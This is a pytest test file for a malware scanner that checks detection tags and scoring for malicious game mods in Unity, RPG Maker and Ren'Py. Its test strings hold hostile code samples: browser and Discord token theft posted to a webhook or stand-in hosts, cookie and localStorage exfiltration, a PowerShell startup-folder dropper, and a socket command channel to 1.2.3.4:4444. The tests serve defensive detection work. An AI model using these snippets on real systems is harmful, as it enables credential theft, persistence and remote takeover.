import pytest

from Virus_Scan.orchestration.bootstrap_initialization import initialize_runtime


@pytest.fixture(scope="module", autouse=True)
def _initialize_stage_game_engine_runtime() -> None:
    initialize_runtime()

from Virus_Scan.detection.scoring.weighting.stage_enrichment import staged_enrichment_score
from Virus_Scan.detection.scoring.weighting.scoreable_tags import scoreable_tag_evidence
from Virus_Scan.detection.chains.execution.anchors import evaluate_chain_evidence
from Virus_Scan.tests.support.canonical_chain_fixtures import physical_tag_evidence
from Virus_Scan.detection.enrichment.strings.contextual.scan import ContextualTagScanRequest, contextual_tag_scan


def _evidence(tags, stage="runtime"):
    evidence = scoreable_tag_evidence(
        physical_tag_evidence(tuple(sorted(tags))), allowed_evidence_kinds=frozenset({"observed", "normalized", "derived", "composite"}),
    )
    chains = evaluate_chain_evidence(tags=evidence)
    stage_score = staged_enrichment_score(evidence, chains, stage)[0]
    return stage_score, chains


def _has_chain(chains, chain_id, status):
    return any(
        decision.candidate.chain_id == chain_id and decision.status == status
        for decision in chains.decisions
    )


def test_unity_token_store_exfil_promotes_medium_anchor():
    blob = "UnityEngine Application.persistentDataPath Login Data Cookies Local State Authorization access_token System.IO.File.ReadAllText requests.post('https://discord.com/api/webhooks/a/b')"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="Assets/Scripts/TokenStealer.cs")))
    assert "unity_token_stealer" in tags
    assert "token_exfiltration" in tags
    stage_score, chains = _evidence(tags, "cs")
    assert stage_score >= 0.0
    assert _has_chain(chains, "token_exfil_chain", "candidate")


def test_rpgm_nwjs_credential_store_read_promotes_stealer_chain():
    blob = "const fs=require('fs'); const os=require('os'); fs.readFileSync(os.homedir()+'/AppData/Roaming/Discord/Local State'); fs.readFileSync('Login Data'); fetch('https://x/upload',{method:'POST',body:token});"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="www/js/plugins/EvilPlugin.js")))
    assert "rpgm_nwjs_credential_stealer" in tags
    assert "browser_credential_access" in tags
    assert "token_exfiltration" in tags
    stage_score, chains = _evidence(tags, "runtime")
    assert stage_score >= 0.0
    assert any(decision.candidate.family == "credential_exfiltration" for decision in chains.decisions)


def test_rpgm_localstorage_cookie_exfil_promotes_storage_exfil_chain():
    blob = "var x=localStorage.getItem('token') + document.cookie + sessionStorage.auth; fetch('https://evil/upload',{method:'POST',body:x});"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="www/js/plugins/StorageExfil.js")))
    assert "rpgm_browser_storage_exfil" in tags
    assert "browser_storage_access" in tags
    assert "token_exfiltration" in tags
    stage_score, chains = _evidence(tags, "runtime")
    assert stage_score >= 0.0
    assert any(decision.candidate.family == "credential_exfiltration" for decision in chains.decisions)


def test_renpy_persistent_dropper_promotes_persistence_chain():
    blob = "init python:\n    persistent.autostart=True\n    open(os.environ['APPDATA']+'\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\run.ps1','w').write(payload)\n    os.system('powershell -ExecutionPolicy Bypass -File run.ps1')"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="game/evil_dropper.rpy")))
    assert "persistence" in tags
    stage_score, chains = _evidence(tags, "runtime")
    assert stage_score >= 0.0
    assert _has_chain(chains, "anchor:renpy_external_process_execution", "candidate")


def test_renpy_socket_c2_promotes_remote_command_channel():
    blob = "import socket,os\ns=socket.socket(); s.connect(('1.2.3.4',4444)); cmd=s.recv(4096); os.system(cmd); s.send(b'token')"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="game/socket_c2.rpy")))
    assert "remote_command_channel" in tags
    assert "network_c2" in tags
    stage_score, chains = _evidence(tags, "runtime")
    assert stage_score >= 0.0
    assert _has_chain(chains, "anchor:network_c2_command_channel", "candidate")
    assert not _has_chain(chains, "anchor:network_c2_command_channel", "confirmed")
